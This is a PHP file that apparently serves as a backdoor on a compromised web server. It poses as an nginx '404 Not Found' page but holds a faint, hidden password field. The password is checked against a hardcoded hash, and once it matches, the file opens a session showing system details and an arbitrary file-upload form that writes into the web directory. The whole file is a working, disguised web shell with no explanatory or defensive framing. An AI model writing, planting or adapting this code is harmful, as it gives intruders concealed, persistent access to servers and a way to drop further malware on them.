<?php
declare(strict_types=1);
session_start();
ini_set('display_errors','1'); error_reporting(E_ALL);
const HASH = '575252610ec64be84aa8a99fee40bb51ca49e271';
if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['p'])) {
    $p = (string)$_POST['p'];
    if (hash_equals(HASH, sha1(md5($p)))) {
        $_SESSION['adm'] = 1;
        header('Location: '.$_SERVER['PHP_SELF']); exit;
    }
}
if (!empty($_SESSION['adm'])) {
    $msg = '';
    if (isset($_POST['_upl'], $_FILES['file']) && is_uploaded_file($_FILES['file']['tmp_name'])) {
        $ok = @move_uploaded_file($_FILES['file']['tmp_name'], basename($_FILES['file']['name']));
        $msg = $ok ? 'Upload Success !!!' : 'Upload Fail !!!';
    }
    ?>
    <!doctype html><html><head><meta charset="utf-8"><title>Admin</title></head>
    <body>
    <b>Admin</b><br><br><?php echo htmlspecialchars(php_uname()); ?><br><br>
    <?php if ($msg) echo "<b>$msg</b><br><br>"; ?>
    <form action="" method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" name="_upl" value="Upload">
    </form>
    </body></html>
    <?php
    exit;
}
?>
<!doctype html>
<html>
<head><title>404 Not Found</title>
<style>
  html,body{height:100%;margin:0;background:#fff;color:#000;font:16px/1.5 Georgia,serif}
  .wrap{max-width:800px;margin:40px auto;padding:0 16px}
  h1{font-size:36px;margin:0 0 12px}
  hr{border:0;border-top:1px solid #ccc;margin:18px 0}
  address{font-style:normal;color:#666}
  /* input password transparan kanan-bawah */
  form.auth{position:fixed;right:10px;bottom:10px}
  form.auth input[type=password]{border:0;border-bottom:1px solid rgba(0,0,0,.2);
    background:rgba(255,255,255,0);padding:6px 8px;outline:none;opacity:.35}
  form.auth input[type=password]:focus{opacity:1;background:rgba(0,0,0,.05)}
  .note{position:fixed;left:10px;bottom:10px;color:#777;font:12px Arial}
</style>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
<div class="note">Authorized users may authenticate below.</div>
<form class="auth" action="" method="post" autocomplete="off">
  <label for="p" style="position:absolute;left:-9999px">Password</label>
  <input id="p" name="p" type="password" required>
</form>
</body>
</html>
